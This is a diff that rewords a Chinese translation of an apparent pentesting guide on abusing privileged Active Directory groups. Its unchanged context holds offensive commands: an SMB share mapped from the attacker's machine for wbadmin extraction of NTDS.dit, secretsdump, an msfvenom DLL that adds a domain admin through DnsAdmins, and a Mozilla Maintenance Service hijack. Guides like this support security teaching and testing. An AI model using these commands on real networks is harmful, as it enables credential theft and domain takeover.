@@ -20,7 +20,7 @@ Get-NetGroupMember -Identity "Account Operators" -Recurse
 
 ## AdminSDHolder 组
 
-**AdminSDHolder** 组的访问控制列表 (ACL) 至关重要，因为它为 Active Directory 中所有“受保护组”设置权限，包括高权限组。该机制通过防止未经授权的修改来确保这些组的安全。
+**AdminSDHolder** 组的访问控制列表 (ACL) 是至关重要的，因为它为 Active Directory 中所有“受保护组”设置权限，包括高权限组。该机制通过防止未经授权的修改来确保这些组的安全。
 
 攻击者可以通过修改 **AdminSDHolder** 组的 ACL 来利用这一点，向标准用户授予完全权限。这将有效地使该用户对所有受保护组拥有完全控制权。如果该用户的权限被更改或移除，由于系统的设计，他们将在一小时内自动恢复。
 
@@ -46,7 +46,7 @@ Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
 
 ### 权限提升
 
-使用 Sysinternals 的 `PsService` 或 `sc`，可以检查和修改服务权限。例如，`Server Operators` 组对某些服务拥有完全控制权，允许执行任意命令和权限提升：
+使用 Sysinternals 的 `PsService` 或 `sc`，可以检查和修改服务权限。例如，`Server Operators` 组对某些服务拥有完全控制权，从而允许执行任意命令和权限提升：
 ```cmd
 C:\> .\PsService.exe security AppReadiness
 ```
@@ -54,7 +54,7 @@ C:\> .\PsService.exe security AppReadiness
 
 ## 备份操作员
 
-加入 `Backup Operators` 组可访问 `DC01` 文件系统，因为拥有 `SeBackup` 和 `SeRestore` 权限。这些权限使得文件夹遍历、列出和复制文件的能力成为可能，即使没有明确的权限，使用 `FILE_FLAG_BACKUP_SEMANTICS` 标志。此过程需要使用特定的脚本。
+加入 `Backup Operators` 组提供对 `DC01` 文件系统的访问权限，因为拥有 `SeBackup` 和 `SeRestore` 权限。这些权限使得文件夹遍历、列出和文件复制成为可能，即使没有明确的权限，也可以使用 `FILE_FLAG_BACKUP_SEMANTICS` 标志。此过程需要使用特定的脚本。
 
 要列出组成员，请执行：
 ```powershell
@@ -117,7 +117,7 @@ secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
 ```
 #### 使用 wbadmin.exe
 
-1. 在攻击者机器上设置 NTFS 文件系统以用于 SMB 服务器，并在目标机器上缓存 SMB 凭据。
+1. 在攻击者机器上设置 NTFS 文件系统以供 SMB 服务器使用，并在目标机器上缓存 SMB 凭据。
 2. 使用 `wbadmin.exe` 进行系统备份和 `NTDS.dit` 提取：
 ```cmd
 net use X: \\<AttackIP>\sharename /user:smbuser password
@@ -130,7 +130,7 @@ echo "Y" | wbadmin start recovery -version:<date-time> -itemtype:file -items:c:\
 
 ## DnsAdmins
 
-**DnsAdmins** 组的成员可以利用他们的权限在 DNS 服务器上加载具有 SYSTEM 权限的任意 DLL，通常托管在域控制器上。此能力允许显著的利用潜力。
+**DnsAdmins** 组的成员可以利用他们的特权在 DNS 服务器上加载任意 DLL，通常托管在域控制器上，具有 SYSTEM 特权。这种能力允许显著的利用潜力。
 
 要列出 DnsAdmins 组的成员，请使用：
 ```powershell
@@ -158,7 +158,7 @@ system("C:\\Windows\\System32\\net.exe group \"Domain Admins\" Hacker /add /doma
 // Generate DLL with msfvenom
 msfvenom -p windows/x64/exec cmd='net group "domain admins" <username> /add /domain' -f dll -o adduser.dll
 ```
-重新启动 DNS 服务（这可能需要额外的权限）是加载 DLL 所必需的：
+重新启动 DNS 服务（可能需要额外的权限）是加载 DLL 所必需的：
 ```csharp
 sc.exe \\dc01 stop dns
 sc.exe \\dc01 start dns
@@ -193,7 +193,7 @@ Hyper-V 管理员对 Hyper-V 拥有完全访问权限，这可以被利用来控
 
 ### 利用示例
 
-Hyper-V 管理员可以利用 Firefox 的 Mozilla Maintenance Service 以 SYSTEM 身份执行命令。这涉及到创建一个指向受保护的 SYSTEM 文件的硬链接，并用恶意可执行文件替换它：
+Hyper-V 管理员可以利用 Firefox 的 Mozilla Maintenance Service 以 SYSTEM 身份执行命令。这涉及创建一个指向受保护的 SYSTEM 文件的硬链接，并用恶意可执行文件替换它：
 ```bash
 # Take ownership and start the service
 takeown /F C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe
@@ -215,11 +215,11 @@ sc.exe start MozillaMaintenance
 ```powershell
 Get-NetGroupMember -Identity "Print Operators" -Recurse
 ```
-有关 **`SeLoadDriverPrivilege`** 的更详细利用技术，应该查阅特定的安全资源。
+有关**`SeLoadDriverPrivilege`**的更详细利用技术，应该查阅特定的安全资源。
 
 #### 远程桌面用户
 
-该组的成员通过远程桌面协议 (RDP) 获得对 PC 的访问权限。要列举这些成员，可以使用 PowerShell 命令：
+该组的成员通过远程桌面协议（RDP）获得对PC的访问权限。要枚举这些成员，可以使用PowerShell命令：
 ```powershell
 Get-NetGroupMember -Identity "Remote Desktop Users" -Recurse
 Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Desktop Users"
